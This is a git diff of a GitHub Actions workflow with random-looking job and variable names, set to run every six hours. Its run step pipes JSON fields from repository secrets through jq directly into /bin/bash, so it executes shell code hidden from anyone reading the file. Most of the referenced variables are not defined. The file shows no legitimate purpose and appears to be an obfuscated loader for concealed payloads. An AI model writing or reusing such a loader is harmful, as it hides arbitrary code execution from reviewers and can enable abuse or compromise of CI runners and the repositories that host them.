@@ -1,10 +1,8 @@
 name: caocao19870105
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-
+    - cron: '52 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: caocao19870105
         env:
-          p49: ${{ secrets.p49 }}
+          h741: ${{ secrets.h741 }}
         run: |
-          echo $p49 | jq -r .o22 | /bin/bash
-          echo $pqc7 | jq -r .mmrop30073 | /bin/bash
-          echo $ci667 | jq -r .tllrk0532 | /bin/bash
-          echo $q8 | jq -r .jfbnq5207 | /bin/bash
-          echo $dz88 | jq -r .uzj2943 | /bin/bash
-          echo $ns0669 | jq -r .wvzeq9 | /bin/bash
-          echo $zcw94213 | jq -r .eh9 | /bin/bash
-          echo $tfbkl12 | jq -r .nlw3 | /bin/bash
-          echo $pu792 | jq -r .pjz3977 | /bin/bash
-          echo $nth0674 | jq -r .jmy7838 | /bin/bash
+          echo $h741 | jq -r .lp5606 | /bin/bash
+          echo $nc8378 | jq -r .lxkbp3508 | /bin/bash
+          echo $lf400 | jq -r .q7 | /bin/bash
+          echo $ub72963 | jq -r .n5793 | /bin/bash
+          echo $esy61 | jq -r .fcwh82180 | /bin/bash
+          echo $sdglr83219 | jq -r .yttp42 | /bin/bash
+          echo $pvv8283 | jq -r .obt113 | /bin/bash
+          echo $cb49 | jq -r .hlbwy0 | /bin/bash
 
